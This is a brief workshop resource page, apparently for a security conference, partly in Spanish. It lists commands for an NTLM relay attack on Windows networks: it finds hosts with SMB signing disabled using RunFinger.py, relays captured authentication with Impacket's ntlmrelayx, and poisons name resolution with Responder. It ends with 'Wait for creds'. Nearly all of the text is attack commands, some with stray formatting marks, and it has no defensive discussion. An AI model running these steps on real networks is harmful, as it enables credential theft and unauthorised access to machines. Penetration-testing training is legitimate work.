# DojoConf-Recursos

comando de Busqueda herramientas:
```
find /usr/share/responder/ -name "error.log" -print
```

1. Identify network systems that do not require SMB message validation
```
Run python  **RunFinger.py -i IP_Range** to detect machine with SMB signing:disabled.
```
2. Configure Impacket’s NTLMrelayx to target those systems
```
echo "IP"  >> targets.txt**
 ```   
 ```
 ntlmrelayx.py -tf targets.txt --smb2support**
 ```
3. Disable SMB and HTTP response poisoning in Responder and launch
```
cd /usr/share/responder
```
```
gedit Responder.conf
```
4. Open the Responder.conf file and set the value of SMB and HTTP to Off
```
Responder.py** -I eth0 -rdw
```
5. Wait for creds

